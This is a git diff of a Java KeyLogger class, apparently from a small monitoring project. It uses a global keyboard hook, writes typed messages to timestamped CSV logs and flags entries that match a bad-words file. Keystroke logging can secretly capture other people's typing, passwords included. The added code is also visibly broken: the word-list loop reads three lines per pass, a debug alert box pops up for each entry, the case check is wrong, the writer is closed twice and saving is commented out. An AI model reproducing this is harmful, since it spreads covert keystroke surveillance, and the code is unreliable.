@@ -5,8 +5,6 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import view.AlertBox;
-import view.Loginer;
-import webService.AWSWebService;
 
 import java.io.*;
 import java.text.SimpleDateFormat;
@@ -16,11 +14,12 @@ import java.util.Scanner;
 
 public abstract class KeyLogger {
 
-    private InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
-    private String fileName =  getCurrentTime();
-    private InputStream filePath = ClassLoader.getSystemResourceAsStream(fileName);
+    private String badWordsFilePath = "/src/main/java/logger/BadWords.csv";
+    String filePath = "/src/main/java/logger/logs/" + getCurrentTime() + ".csv";
+    String warningFilePath = "/src/main/java/logger/logs/" + "WARNING!_" + getCurrentTime() + ".csv";
 
-    public static ArrayList<String> log = new ArrayList<>();
+    String fileName = getCurrentTime() + ".csv";
+    String warningFileName = "WARNING!_" + getCurrentTime() + ".csv";
 
 
     String message;
@@ -40,9 +39,17 @@ public abstract class KeyLogger {
 
     void saveMessage() throws IOException {
         if(checkForBadWords(message)) {
-            Loginer.foundBadWord = true;
+//            File oldFile = new File(filePath);
+//            filePath = warningFilePath;
+//            fileName = warningFileName;
+//            File newFile = new File(warningFilePath);
+//            if(oldFile.renameTo(newFile)){
+//                System.out.println("Rename succesful");
+//            }else{
+//                System.out.println("Rename failed");
+//            }
         }
-        writeToFile(message);
+//        writeToFile(filePath);
     }
 
 
@@ -60,15 +67,25 @@ public abstract class KeyLogger {
     }
 
     private void writeToFile(String file) {
-        System.out.println(file);
-        log.add(file + "\n");
-        setDefaults();
+        try {
+            BufferedWriter writer = new BufferedWriter(new FileWriter(file, true));
+            writer.write(message);
+            writer.newLine();
+            writer.flush();
+            writer.close();
+            System.out.println(message);
+            System.out.println("Message saved sucsessfully");
+            setDefaults();
+            writer.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     private boolean checkForBadWords(String message) {
         ArrayList<String> badWords = getBadWords();
         for (String badWord: badWords) {
-            if(message.toUpperCase().contains(badWord.toUpperCase())) {
+            if(message.contains(badWord.toUpperCase())) {
                 return true;
             }
         }
@@ -78,17 +95,23 @@ public abstract class KeyLogger {
     private ArrayList<String> getBadWords () {
         ArrayList<String> badWords = new ArrayList<>();
         Scanner scanner = null;
-        scanner = new Scanner(badWordsFilePath);
+        try {
+            scanner = new Scanner(new File(badWordsFilePath));
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
         if(scanner != null) {
             while (scanner.hasNext()) {
+                AlertBox.display("ASD", scanner.nextLine());
                 badWords.add(scanner.nextLine());
-                }
+                System.out.println(scanner.nextLine());
+            }
             scanner.close();
         }
         return badWords;
     }
 
-    public InputStream getFilePath() {
+    public String getFilePath() {
         return filePath;
     }
 
